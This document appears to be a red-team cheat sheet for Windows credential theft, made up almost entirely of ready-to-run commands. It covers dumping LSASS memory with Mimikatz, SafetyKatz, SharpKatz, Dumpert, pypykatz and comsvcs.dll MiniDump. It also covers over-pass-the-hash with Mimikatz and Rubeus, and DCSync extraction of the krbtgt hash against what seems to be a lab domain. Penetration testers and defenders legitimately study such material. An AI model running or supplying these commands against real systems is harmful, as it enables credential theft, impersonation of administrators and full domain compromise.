# Dumping

## LSASS

{% hint style="warning" %}
high chances of detection
{% endhint %}

```powershell
# Dump credentials on a local machine using Mimikatz.
Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 

# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys" 

# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys

# Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

# Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa

# Using comsvcs.dll
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
<lsass process ID> C:\Users\Public\lsass.dmp full 
```

## Over Pass The Hash (OPTH)

Over pass the hash is used between domain joined and not passing directly the NTLM hash to authenticate, instead asking for TGT.

<pre class="language-powershell" data-overflow="wrap" data-full-width="false"><code class="lang-powershell"><strong>Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:&#x3C;aes256key> /run:powershell.exe"'
</strong>
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:&#x3C;aes256keys>  /run:cmd.exe" "exit"

Rubeus.exe asktgt /user:administrator /rc4:&#x3C;ntlmhash> /ptt

Rubeus.exe asktgt /user:administrator /aes256:&#x3C;aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
</code></pre>

## DCSync

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```
{% endcode %}
